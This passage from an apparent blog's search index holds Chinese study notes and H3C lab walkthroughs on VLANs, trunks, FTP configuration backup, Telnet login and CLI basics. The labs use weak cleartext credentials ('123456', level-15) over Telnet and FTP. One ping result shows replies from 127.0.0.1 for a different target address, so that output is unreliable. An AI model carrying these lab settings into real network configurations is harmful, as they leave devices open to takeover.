#查看MST域配置</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCL之Vlan和Trunk实验</title>
      <link href="/posts/46178"/>
      <url>/posts/46178</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/HCL%E4%B9%8BVlan%E5%92%8CTrunk%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，描述中的R1或SW1对应拓扑中设备名称末尾数字为1的设备，R2或SW2对应拓扑中设备名称末尾数字为2的设备，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><ol><li>按图示为PC配置IP地址</li><li>SW1和SW2上分别创建vlan10和vlan20，要求PC3和PC5属于vlan10，PC4和PV6属于vlan20</li><li>SW1和SW2相连的接口配置为trunk类型，允许vlan10和vlan20通过</li><li>测试效果，同一vlan的PC可以互通，不同vlan的PC无法互通</li></ol><hr><ol><li><p><strong>PC配置IP地址命令略</strong></p></li><li><p><strong>SW1和SW2上分别创建vlan10和vlan20</strong></p><p><em>步骤1：在SW1上创建vlan10和vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1-vlan10]vlan 20</span><br><span class="line">[SW1-vlan20]</span><br></pre></td></tr></table></figure><p><em>步骤2：在SW2上创建vlan10和vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]vlan 10</span><br><span class="line">[SW2-vlan10]vlan 20</span><br><span class="line">[SW2-vlan20]</span><br></pre></td></tr></table></figure></li><li><p><strong>SW1和SW2都把g1&#x2F;0&#x2F;1接口加入vlan10，g1&#x2F;0&#x2F;2接口加入vlan20</strong></p><p><em>步骤1：在SW1上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1-vlan10]port g1/0/1</span><br><span class="line">[SW1-vlan10]vlan 20</span><br><span class="line">[SW1-vlan20]port g1/0/2</span><br></pre></td></tr></table></figure><p><em>步骤2：在SW2上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW2]vlan 10</span><br><span class="line">[SW2-vlan10]port g1/0/1</span><br><span class="line">[SW2-vlan10]vlan 20</span><br><span class="line">[SW2-vlan20]port g1/0/2</span><br></pre></td></tr></table></figure></li><li><p><strong>SW1和SW2的g1&#x2F;0&#x2F;3接口都配置为trunk，允许vlan10和vlan20通过</strong></p><p><em>步骤1：在SW1上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port link-type trunk </span><br><span class="line">[SW1-GigabitEthernet1/0/3]port trunk permit vlan 10 20</span><br></pre></td></tr></table></figure><p><em>步骤2：在SW2上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]interface g1/0/3</span><br><span class="line">[SW2-GigabitEthernet1/0/3]port link-type trunk </span><br><span class="line">[SW2-GigabitEthernet1/0/3]port trunk permit vlan 10 20</span><br></pre></td></tr></table></figure></li><li><p><strong>测试结果，如下所示，PC3可以PING通PC5，但无法PING通PC4和PC6</strong></p><p><em>步骤1：在PC3上PingPC4，发现不能Ping通</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.1.2</span><br><span class="line">Ping 192.168.1.2 (192.168.1.2): 56 data bytes, press CTRL_C to break</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br></pre></td></tr></table></figure><p><em>步骤2：在PC3上PingPC5，发现可以Ping通</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.1.3</span><br><span class="line">Ping 127.0.0.1 (127.0.0.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 127.0.0.1: icmp_seq=0 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 127.0.0.1: icmp_seq=1 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 127.0.0.1: icmp_seq=2 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 127.0.0.1: icmp_seq=3 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 127.0.0.1: icmp_seq=4 ttl=255 time=0.000 ms</span><br></pre></td></tr></table></figure><p><em>步骤3：在PC3上PingPC6，发现不能Ping通</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.1.4</span><br><span class="line">Ping 192.168.1.4 (192.168.1.4): 56 data bytes, press CTRL_C to break</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br></pre></td></tr></table></figure></li></ol><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VLAN技术</title>
      <link href="/posts/63362"/>
      <url>/posts/63362</url>
      
        <content type="html"><![CDATA[<br /><h3 id="VLAN的定义"><a href="#VLAN的定义" class="headerlink" title="VLAN的定义"></a>VLAN的定义</h3><ul><li><code>虚拟局域网，用来在二层网络中隔离广播域</code></li><li><code>不同VLAN的设备在二层网络中无法相互通讯</code></li></ul><h3 id="VLAN的转发过程举例"><a href="#VLAN的转发过程举例" class="headerlink" title="VLAN的转发过程举例"></a>VLAN的转发过程举例</h3><p>1.<code>PC发送数据帧进入交换机，会被打上Vlan Tag;Vlan Tag中的vlan id就是收到帧的接口的所属Vlan;一旦数据帧被打上Vlan Tag,就变成了802.1Q格式的帧</code></p><p>2.<code>交换机在标签中的VLAN所属的MAC地址记录中检查数据帧的目的MAC地址，进行判断；如果查到了记录，就按照记录对应的接口转发；如果没查到，就在标签中的VLAN内进行广播处理</code></p><p>3.<code>数据帧从出接口发往PC前，会剥离vlan tag,使之还原为标准的以太网帧格式</code></p><h4 id="802-1Q"><a href="#802-1Q" class="headerlink" title="802.1Q"></a>802.1Q</h4><ul><li><code>在源MAC地址和Type之间携带Vlan Tag的帧格式，计算机不识别</code></li></ul><h3 id="VLAN工作原理"><a href="#VLAN工作原理" class="headerlink" title="VLAN工作原理"></a>VLAN工作原理</h3><h4 id="交换机端口类型"><a href="#交换机端口类型" class="headerlink" title="交换机端口类型"></a>交换机端口类型</h4><p><em><strong>Access</strong></em></p><ul><li><code>必须加入到一个vlan;只能加入到一个vlan;从access端口收到的帧,会打上该端口所属vlan的tag;从access端口发出的帧会剥离tag</code></li><li><code>一般用来连接PC或路由器</code></li><li><code>H3C交换机默认所有端口都是access类型数据vlan1;华为hybrid</code></li></ul><p><em><strong>Trunk</strong></em></p><ul><li><code>可以允许多个vlan的数据通过；从trunk端口发出的帧保留vlan tag，但是缺省vlan除外；trunk端口收到未到tag的帧，会重新打上缺省vlan的tag</code></li><li><code>一般用来连接交换机</code></li></ul><p><em><strong>Hybrid</strong></em></p><ul><li><code>可以允许多个vlan数据通过，可以手动配置从Hybrid端口发出的帧，哪个vlan保留tag,哪个vlan剥离tag；Hybrid收到未打tag的帧，会重新打上缺省vlan的tag</code></li><li><code>既可以连接PC/路由器，也可以连接交换机</code></li></ul><h4 id="PVID"><a href="#PVID" class="headerlink" title="PVID"></a>PVID</h4><p><em><strong>定义</strong></em> </p><ul><li><code>(Port Default VLAN ID)PVID又称缺省VLAN表示某个端口的缺省vlan</code></li></ul><p><em><strong>特征</strong></em></p><ul><li><code>Access端口所属的vlan就是pvid，不用配置，默认是vlan1</code></li><li><code>Trunk端口需要手动配置pvid，默认是vlan1</code></li><li><code>Hybrid端口需要手动配置pvid，默认是vlan1</code></li></ul><h3 id="VLAN类型"><a href="#VLAN类型" class="headerlink" title="VLAN类型"></a>VLAN类型</h3><p><em><strong>基于端口的VLAN</strong></em></p><p><code>端口固定属于某个vlan</code></p><p><em><strong>基于Mac地址的VLAN</strong></em></p><ul><li><code>Mac地址绑定到vlan,同一Mac地址的设备，无论连接在哪个端口，vlan归属不变</code></li><li><code>端口类型需要配置为Hybrid</code></li></ul><p><em><strong>基于协议的VLAN</strong></em></p><ul><li><code>三层协议绑定到vlan,同一协议的报文，无论从哪个端口接收，vlan归属不变</code></li><li><code>端口类型需要配置为Hybrid</code></li></ul><p><em><strong>基于IP子网的VLAN</strong></em></p><ul><li><code>IP网段绑定到vlan,同一IP子网的设备，无论连接在哪个端口，vlan归属不变</code></li><li><code>端口类型需要配置为Hybrid</code></li></ul><p><em><strong>VLAN的归属优先级</strong></em></p><ul><li><code>Mac地址vlan&gt;IP子网vlan&gt;协议vlan&gt;端口vlan</code></li></ul><h3 id="VLAN常用命令"><a href="#VLAN常用命令" class="headerlink" title="VLAN常用命令"></a>VLAN常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[h3c]vlan &#x27;vlan id&#x27;创建vlan,进入视图</span><br><span class="line">[h3c-vlan10]name &#x27;text&#x27;vlan命名</span><br><span class="line">[h3c-vlan10]port &#x27;port id&#x27;把端口以Access类型加入到vlan</span><br><span class="line">[h3c-GigabitEthernet1/0/1]port link-type &#x27;access/trunk/hybrid&#x27;配置端口类型</span><br><span class="line">[h3c-GigabitEthernet1/0/1]port trunk permit vlan &#x27;vlan-id-list/all&#x27;配置Trunk端口允许通过的vlan</span><br><span class="line">[h3c]display vlan &#x27;vlan id&#x27;查看某个vlan详细信息</span><br><span class="line">[h3c]display vlan brief查看vlan摘要信息</span><br><span class="line">[h3c]display port trunk查看Trunk端口信息</span><br><span class="line">[h3c-GigabitEthernet1/0/1]undo port link-type还原交换机的默认端口类型</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络设备调试</title>
      <link href="/posts/33917"/>
      <url>/posts/33917</url>
      
        <content type="html"><![CDATA[<br /><h4 id="网络设备系统调试"><a href="#网络设备系统调试" class="headerlink" title="网络设备系统调试"></a>网络设备系统调试</h4><p><font size=6><strong>Debug</strong></font></p><p><em><strong>定义</strong></em></p><ul><li><code>对相应的协议所收发的所有报文全部在屏幕上输出显示</code></li><li><code>用于网络排错</code></li></ul><p><em><strong>开启debug命令</strong></em></p><ul><li><code>terminal monitor</code></li><li><code>terminal debugging</code></li><li><code>debugging 协议类型</code></li></ul><p><em><strong>结束dubug</strong></em></p><ul><li><code>undo debugging all</code></li><li><code>CTRL+O</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCL配置管理实验</title>
      <link href="/posts/61021"/>
      <url>/posts/61021</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/HCL%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><ol><li>按照图示连接到真机，并配置IP地址（真机IP地址配置到VirtualBox Host-Only Ethernet Adapter网卡）</li><li>R1保存当前配置</li><li>在R1上开启FTP服务</li><li>使用真机访问FTP服务，把R1的配置文件拷贝到本地</li><li>在R1上清空配置，重启R1，确认已配置为空配状态</li><li>再次在R1开启FTP服务，并把真机拷贝的配置文件还原到路由器</li><li>更改R1的启动配置文件名</li><li>再次重启R1，确认配置已还原</li></ol><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><ol><li><p><strong>配置IP地址部分略</strong></p></li><li><p><strong>R1保存当前配置，并确认，命令如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]save force</span><br><span class="line">Validating file. Please wait...</span><br><span class="line">Configuration is saved to device successfully.</span><br></pre></td></tr></table></figure></li><li><p><strong>R1上开启FTP服务，创建用户<code>xudaye</code>，密码<code>123456</code></strong></p><p><em>步骤1：开启FTP服务</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ftp server enable </span><br></pre></td></tr></table></figure><p><em>步骤2：创建用于FTP身份验证的用户，配置密码，并设置用户权限级别和服务类型</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]local-user xudaye class manage</span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-manage-xudaye]password simple 123456</span><br><span class="line">[R1-luser-manage-xudaye]authorization-attribute user-role level-15</span><br><span class="line">[R1-luser-manage-xudaye]service-type ftp</span><br></pre></td></tr></table></figure></li><li><p><strong>使用真机访问FTP服务，备份R1的配置文件</strong></p><p><em>步骤1：使用资源管理器访问FTP服务，输入用户名和密码，如图1-2所示</em></p><p><img src="/images/HCL%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/02.jpg"><em>图1-2</em></p><p><em>步骤2：复制R1的配置文件，如图1-3所示</em></p><p><img src="/images/HCL%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/03.jpg"><em>图1-3</em></p></li><li><p><strong>在R1上清空配置，命令如下</strong></p><p>　<em>分析：此时R1的配置已经备份到PC上，现在把R1的配置清空，再测试还原备份的配置是否有效</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;reset saved-configuration </span><br><span class="line">The saved configuration file will be erased. Are you sure? [Y/N]:y</span><br><span class="line">Configuration file in flash: is being cleared.  </span><br><span class="line">Please wait ...</span><br><span class="line">Configuration file is cleared.</span><br></pre></td></tr></table></figure></li><li><p><strong>重启R1，命令如下</strong></p><p>　　<em>注意：重启设备时，第一次确认提示是设备检测到配置被清空，询问是否要重新保存当前配置。此次询问需要输入<code>n</code>来否定；第二次确认提示才是询问是否确认要重启，应该输入<code>y</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;reboot</span><br><span class="line">Start to check configuration with next startup configuration file, please wait.........DONE!</span><br><span class="line">Current configuration may be lost after the reboot, save current configuration? [Y/N]:n</span><br><span class="line">This command will reboot the device. Continue? [Y/N]:y</span><br><span class="line">Now rebooting, please wait...</span><br></pre></td></tr></table></figure></li><li><p><strong>查看R1配置，发现R1的配置已经变成空配状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;display current-configuration </span><br><span class="line">#</span><br><span class="line"> version 7.1.075, Alpha 7571</span><br><span class="line">#</span><br><span class="line"> sysname H3C</span><br><span class="line">#</span><br><span class="line">system-working-mode standard</span><br><span class="line">xbar load-single</span><br><span class="line">password-recovery enable</span><br><span class="line">lpu-type f-series</span><br><span class="line">#</span><br><span class="line">vlan 1   </span><br></pre></td></tr></table></figure></li><li><p><strong>再次把R1的g0&#x2F;0口配置IP地址，并开启FTP，命令略</strong></p></li><li><p><strong>把真机上的配置文件还原到路由器，过程略</strong></p></li><li><p><strong>更改R1的启动配置文件名，命令如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;startup saved-configuration startup.cfg </span><br><span class="line">Please wait...... Done.</span><br></pre></td></tr></table></figure></li><li><p><strong>重启R1，确认配置已经还原到清空前的状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;display cu</span><br><span class="line">&lt;R1&gt;display current-configuration </span><br><span class="line">#</span><br><span class="line"> version 7.1.075, Alpha 7571</span><br><span class="line">#</span><br><span class="line"> sysname R1</span><br><span class="line">#</span><br><span class="line"> system-working-mode standard</span><br><span class="line"> xbar load-single</span><br><span class="line"> password-recovery enable</span><br><span class="line"> lpu-type f-series</span><br><span class="line">#</span><br><span class="line">vlan 1</span><br></pre></td></tr></table></figure><hr></li></ol><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络设备文件管理</title>
      <link href="/posts/8736"/>
      <url>/posts/8736</url>
      
        <content type="html"><![CDATA[<br /><h3 id="网络设备文件管理"><a href="#网络设备文件管理" class="headerlink" title="网络设备文件管理"></a>网络设备文件管理</h3><p><em><strong>设备存储器</strong></em></p><p><img src="/images/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/01.jpg"></p><p>ROM    </p><ul><li><code>只读存储器，存储了Bootrom程序，在Bootrom模式下可以破解密码。断电后依旧保留数据。这一类存储器一般用来存放固件，比如计算机固件启动需要引导固件</code></li></ul><p>RAM</p><ul><li><code>内存，存储当前正在运行的数据，断电数据会丢失</code></li></ul><p>Flash</p><ul><li><code>闪存，永久存储操作系统文件，配置文件等数据</code></li></ul><p><em><strong>设备的配置文件</strong></em></p><p>当前配置</p><ul><li><code>current-configuration</code></li><li><code>设备当前正在运行和生效的配置信息，存储在RAM中</code></li></ul><p>起始配置</p><ul><li><code>startup-configuration</code></li><li><code>每次设备开启会自动加载的配置信息，存储在Flash中</code></li></ul><p>起始配置文件的备份</p><ul><li><code>通过USB或者FTP把startup.cfg和startup.mdb拷贝到其他存储</code></li><li><code>配置还原后，需要通过startup saved-configuration startup.cfg命令来指定新的文件</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telnet配置实验</title>
      <link href="/posts/26328"/>
      <url>/posts/26328</url>
      
        <content type="html"><![CDATA[<br /><h2 id="Telnet配置实验"><a href="#Telnet配置实验" class="headerlink" title="Telnet配置实验"></a>Telnet配置实验</h2><hr><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><em>Telnet配置的三种方式</em></p><ul><li><p>none：表示下次使用该用户线登录时不需要进行用户名和密码认证，任何人都可以登录到设备上，这种情况可能会带来安全隐患。</p></li><li><p>password：表示下次使用该用户线登录时，需要输入密码。只有密码正确，用户才能登录到设备上。配置认证方式为password后，请妥善保存密码。</p></li><li><p>scheme：表示下次使用该用户线登录设备时需要进行用户名和密码认证，用户名或密码错误，均会导致登录失败。配置认证方式为scheme后，请妥善保存用户名及密码</p></li></ul><p><em>需要掌握的知识</em></p><p><em>用户角色</em></p><ul><li><strong>network-admin</strong>：具有最高权限，可操作系统所有功能和资源</li><li><strong>network-operator</strong>：可执行系统所有的功能和资源的相关display命令（display history-command除外）</li><li><strong>level-0 ~ level-15</strong>：预定义的用户角色，仅用户角色level-0～level-14可以通过自定义规则和资源控制策略调整自身的权限。level-15具有与network-admin角色相同的权限，管理员无法对其进行配置</li></ul><p><strong>缺省情况下，使用Console&#x2F;AUX用户线登录系统的用户将被授权用户角色network-admin；通过其它用户线登录系统的用户将被授权用户角色network-operator</strong></p><p><em>VTY</em></p><ul><li>VTY（Virtual Type Terminal，虚拟类型终端）用户线：用来管理和监控通过Telnet或SSH登录的用户</li></ul><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/Telnet%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，描述中的R1或SW1对应拓扑中设备名称末尾数字为1的设备，R2或SW2对应拓扑中设备名称末尾数字为2的设备，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><ol><li>按照图示连接到真机，并配置IP地址（真机IP地址配置到VirtualBox Host-Only Ethernet Adapter网卡）</li><li>在R1上开启Telnet服务，创建用户<code>xudaye</code>，密码<code>123456</code>用于身份验证</li><li>在真机上使用secure-CRT通过Telnet登录R1</li></ol><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><ol><li><p>连接真机，配置IP地址，真机IP地址为192.168.1.2 24</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]int g 0/0</span><br><span class="line">[R1]ip add 192.168.1.1 24</span><br></pre></td></tr></table></figure></li><li><p>R1上开启Telnet服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]telnet server enable</span><br></pre></td></tr></table></figure></li><li><p>​     R1上创建用户“xudaye”，密码“123456”用于Telnet身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]local-user xudaye class manage </span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-manage-xudaye]password simple 123456</span><br><span class="line">[R1-luser-manage-xudaye]service-type telnet </span><br><span class="line">[R1-luser-manage-xudaye]authorization-attribute user-role level-15</span><br></pre></td></tr></table></figure></li><li><p>在vty终端视图下配置Telnet验证模式为AAA验证，权限为Level-15</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]user-interface vty 0 4</span><br><span class="line">[R1-line-vty0-4]authentication-mode scheme </span><br><span class="line">[R1-line-vty0-4]user-role level-15</span><br></pre></td></tr></table></figure></li><li><p>真机上使用CRT通过Telnet登录R1，CRT连接配置如图1-2所示，登录界面如图1-2所示</p><p><em>步骤1：打开CRT，点击快速连接，协议选择<code>Telnet</code>，主机名为<code>192.168.1.1</code>，端口默认不变，然后点击连接，如图1-2所示</em></p><p><img src="/images/Telnet%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C/02.jpg"><em>图1-2</em></p></li></ol><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>相关文章  <a href="https://www.sohu.com/a/459217758_657867">——</a> </p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令行操作基础</title>
      <link href="/posts/12111"/>
      <url>/posts/12111</url>
      
        <content type="html"><![CDATA[<br/><h3 id="H3C路由交换产品连接方法"><a href="#H3C路由交换产品连接方法" class="headerlink" title="H3C路由交换产品连接方法"></a>H3C路由交换产品连接方法</h3><p><em><strong>使用console线本地连接</strong></em></p><ul><li><code>协议Serial,接口com口，波特率9600</code></li><li><code>适用于设备的初次调试</code></li></ul><p><em><strong>使用Telnet远程访问</strong></em></p><ul><li><code>适用于设备上架配置好后的维护管理</code></li></ul><p><em><strong>使用SSH远程访问</strong></em></p><ul><li><code>数据传输过程加密，安全的远程访问</code></li></ul><h3 id="命令行使用基础"><a href="#命令行使用基础" class="headerlink" title="命令行使用基础"></a>命令行使用基础</h3><p><em><strong>命令行视图</strong></em></p><ul><li><p>用户视图</p><ul><li><code>&lt;h3c&gt;</code></li><li><code>只能查看配置，不能修改配置</code></li></ul></li><li><p>系统视图</p><ul><li><code>[h3c]</code></li><li><code>可以查看和修改全局配置</code></li></ul></li><li><p>接口视图</p><ul><li><code>[H3C-GigabitEthernet0/0]</code></li><li><code>可以对接口修改配置</code></li></ul></li></ul><p><em><strong>视图切换</strong></em></p><ul><li><code>system-view</code>从用户视图进入系统视图</li><li><code>interfaec g0/0</code>  从系统视图进入g0&#x2F;0接口的接口视图</li><li><code>quit</code>          返回上层视图</li><li><code>return</code>       <ul><li>直接返回到用户视图</li><li>快捷键Ctrl+Z</li></ul></li></ul><p><em><strong>常用查看命令</strong></em></p><ul><li><p><code>display current-configuration</code>查看当前所有配置</p></li><li><p><code>display ip interface brief</code></p><ul><li><p>查看所有三层接口的摘要信息</p></li><li><p>接口的IP地址</p></li><li><p>接口的连通状态</p></li></ul></li><li><p><code>display interface g0/0</code>查看g0&#x2F;0接口的详细信息</p></li><li><p><code>display version</code>查看设备硬件版本信息</p></li><li><p><code>display this</code>查看当前视图下配置了哪些参数</p></li></ul><p><em><strong>设备操作命令</strong></em></p><p><code>sysname R1</code>更改设备名称为R1，系统视图</p><p><code>reboot</code>重启设备，用户视图</p><p><code>save</code>保存当前配置，系统视图</p><p><code>reset saved-configuration</code>清空保存的配置，用户视图</p><p><code>undo</code>在命令前加入代表执行命令反向操作</p><p><code>shutdown</code>手动关闭接口，接口视图</p><p><code>undo shutdown</code>  手动开启接口</p><p><em><strong>命令行帮助</strong></em></p><ul><li><code>命令简写</code>  </li><li><code>？键命令提示</code></li><li><code>Tab键自动补齐命令</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器和交换机介绍</title>
      <link href="/posts/4979"/>
      <url>/posts/4979</url>
      
